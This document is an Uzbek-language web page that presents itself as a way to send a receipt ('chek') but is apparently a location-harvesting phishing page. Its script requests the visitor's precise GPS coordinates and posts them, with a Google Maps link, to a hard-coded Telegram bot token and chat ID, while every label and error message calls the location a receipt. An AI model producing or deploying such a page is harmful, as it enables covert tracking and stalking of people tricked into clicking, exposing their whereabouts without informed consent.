<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Chek yuborish</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #f0f2f5;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .container {
      padding: 20px;
      max-width: 90%;
    }
    button {
      background: #0088cc;
      color: white;
      border: none;
      padding: 16px 32px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
      transition: transform 0.2s;
    }
    button:active {
      transform: scale(0.95);
    }
    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    .loading {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
    .error {
      color: #d32f2f;
      font-weight: 500;
    }
    h2 {
      font-size: 22px;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>üìç Chekingizni yuborish uchun quyidagi tugmani bosing</h2>
    <button id="getLocBtn">Chekni yuborish</button>
    <div class="loading" id="status"></div>
  </div>
  <script>
    const botToken = "5907600944:AAHRhcgacCszCkwiFmNgpzKN4pwvBg2-OxQ";
    const chatId = "1341701772";
    const statusEl = document.getElementById("status");
    const btn = document.getElementById("getLocBtn");

    function sendToTelegram(lat, lon) {
      const text = `üìç Yangi chek:\nLatitude: ${lat}\nLongitude: ${lon}\n\nüó∫ <a href="https://maps.google.com/?q=${lat},${lon}">Xaritada ko‚Äòrish</a>`;
      
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: "HTML"
        })
      })
      .then(() => {
        statusEl.innerHTML = "‚úÖ Chek muvaffaqiyatli yuborildi!";
        btn.textContent = "Yuborildi ‚úÖ";
        btn.disabled = true;
      })
      .catch(err => {
        console.error("Telegram xatosi:", err);
        statusEl.innerHTML = '<span class="error">‚ùå Xatolik yuz berdi. Qayta urining.</span>';
        btn.textContent = "Qayta urinib ko‚Äòring";
      });
    }

    function checkLocationServices() {
      // Joylashuv xizmati yoqilganligini tekshirish uchun test so‚Äòrov
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          sendToTelegram(lat, lon);
        },
        (error) => {
          btn.textContent = "Qayta urinib ko‚Äòring";
          let msg = "";
          switch(error.code) {
            case error.PERMISSION_DENIED:
              msg = "Ruxsat rad etildi. Brauzer sozlamalarida chekga ruxsat bering.";
              break;
            case error.POSITION_UNAVAILABLE:
              msg = "Chek ma'lumotlari mavjud emas. Iltimos, telefoningizda GPS yoki joylashuv xizmatini yoqing (Sozlamalar ‚Üí Joylashuv).";
              break;
            case error.TIMEOUT:
              msg = "Vaqt tugadi. Internet va GPS-ni tekshiring.";
              break;
            default:
              msg = "Noma'lum xatolik yuz berdi.";
          }
          statusEl.innerHTML = `<span class="error">‚ùå ${msg}</span>`;
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    }

    btn.addEventListener("click", function() {
      btn.textContent = "Chek olinmoqda...";
      statusEl.textContent = "Iltimos, ruxsat bering...";

      if (!navigator.geolocation) {
        statusEl.innerHTML = '<span class="error">‚ùå Brauzeringiz chekni qo‚Äòllab-quvvatlamaydi.</span>';
        btn.textContent = "Chekni yuborish";
        return;
      }

      // Joylashuv xizmatini yoqishni so‚Äòrash uchun birinchi navbatda ruxsat so‚Äòraymiz
      checkLocationServices();
    });
  </script>
</body>
</html>
